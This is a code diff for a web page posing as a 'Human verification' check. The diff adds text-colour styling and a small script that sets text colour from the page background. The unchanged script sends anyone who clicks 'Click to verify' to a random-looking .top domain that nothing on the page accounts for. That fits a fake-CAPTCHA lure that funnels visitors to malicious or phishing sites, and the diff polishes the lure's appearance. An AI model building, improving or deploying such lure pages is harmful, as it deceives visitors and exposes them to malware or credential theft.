@@ -32,6 +32,15 @@
             display: inline-block;
             animation: dotsAnimation 2s infinite;
         }
+
+        /* Default text color */
+        .text-black {
+            color: black;
+        }
+
+        .text-white {
+            color: white;
+        }
     </style>
     <script>
         function verifyHuman() {
@@ -41,18 +50,43 @@
                 window.location.href = 'https://sdnfhbguysdhifjo.top/x';
             }, 1000); // Optional delay before redirecting
         }
+
+        function setTextColorBasedOnBg() {
+            const body = document.body;
+            const bgColor = window.getComputedStyle(body).backgroundColor;
+            const textElements = document.querySelectorAll('.text-color');
+
+            // Convert RGB to hex for easier comparison
+            const rgbToHex = (rgb) => {
+                const rgbArray = rgb.match(/\d+/g);
+                return `#${((1 << 24) + (parseInt(rgbArray[0]) << 16) + (parseInt(rgbArray[1]) << 8) + parseInt(rgbArray[2])).toString(16).slice(1)}`;
+            };
+
+            const hexColor = rgbToHex(bgColor);
+
+            if (hexColor !== '#ffffff') { // If background is not white
+                textElements.forEach(el => el.classList.add('text-white'));
+                textElements.forEach(el => el.classList.remove('text-black'));
+            } else { // If background is white
+                textElements.forEach(el => el.classList.add('text-black'));
+                textElements.forEach(el => el.classList.remove('text-white'));
+            }
+        }
+
+        // Call the function on page load
+        window.onload = setTextColorBasedOnBg;
     </script>
 </head>
 <body>
     <div id="__next">
         <div class="flex h-screen justify-center">
             <div>
-                <h2 class="mt-2 text-center text-3xl">Human verification</h2>
-                <p class="mt-2 text-center text-sm">Please verify that you are human</p>
+                <h2 class="mt-2 text-center text-3xl text-color">Human verification</h2>
+                <p class="mt-2 text-center text-sm text-color">Please verify that you are human</p>
                 <div class="mt-6">
                     <div style="min-height:3rem" class="bg-blue-800 shadow-xl rounded-lg border-blue-800 hover:bg-blue-900 cursor-pointer relative" onclick="verifyHuman()">
                         <div class="absolute inset-0 flex items-center justify-center px-4 py-3 space-x-2">
-                            <label id="verify-button" for="human" class="text-center text-sm font-medium text-slate-100">Click to verify</label>
+                            <label id="verify-button" for="human" class="text-center text-sm font-medium text-slate-100 text-color">Click to verify</label>
                         </div>
                     </div>
                 </div>
@@ -76,3 +110,4 @@
     </script>
 </body>
 </html>
+
